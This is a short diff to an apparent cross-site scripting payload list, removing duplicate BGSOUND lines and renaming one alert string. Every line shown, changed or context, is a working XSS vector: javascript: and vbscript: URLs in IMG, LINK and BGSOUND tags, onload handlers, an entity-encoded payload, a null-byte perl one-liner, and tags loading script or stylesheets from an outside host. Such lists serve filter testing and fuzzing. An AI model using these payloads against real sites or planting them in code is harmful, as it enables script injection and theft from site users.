@@ -271,7 +271,6 @@ top.__proto__._= alert_(1)
 <IMG SRC='vbscript:msgbox("XSS")'>
 <IMG SRC="livescript:[code]">
 <BODY ONLOAD=alert('XSS')>
-<BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
 <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
@@ -357,7 +356,6 @@ SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#10
 <BODY ONLOAD=alert('XSS')>
 <IMG DYNSRC="javascript:alert('XSS')">
 <IMG LOWSRC="javascript:alert('XSS')">
-<BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
 <LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
@@ -918,7 +916,7 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 <IMG SRC="livescript:[code]">
 <BODY ONLOAD=alert('XSS')>
 xss"><!--><svg/onload=alert(document.domain)>
-<BGSOUND SRC="javascript:alert('XSS');">
+<BGSOUND SRC="javascript:alert('XSS1');">
 <BR SIZE="&{alert('XSS')}">
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
 <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
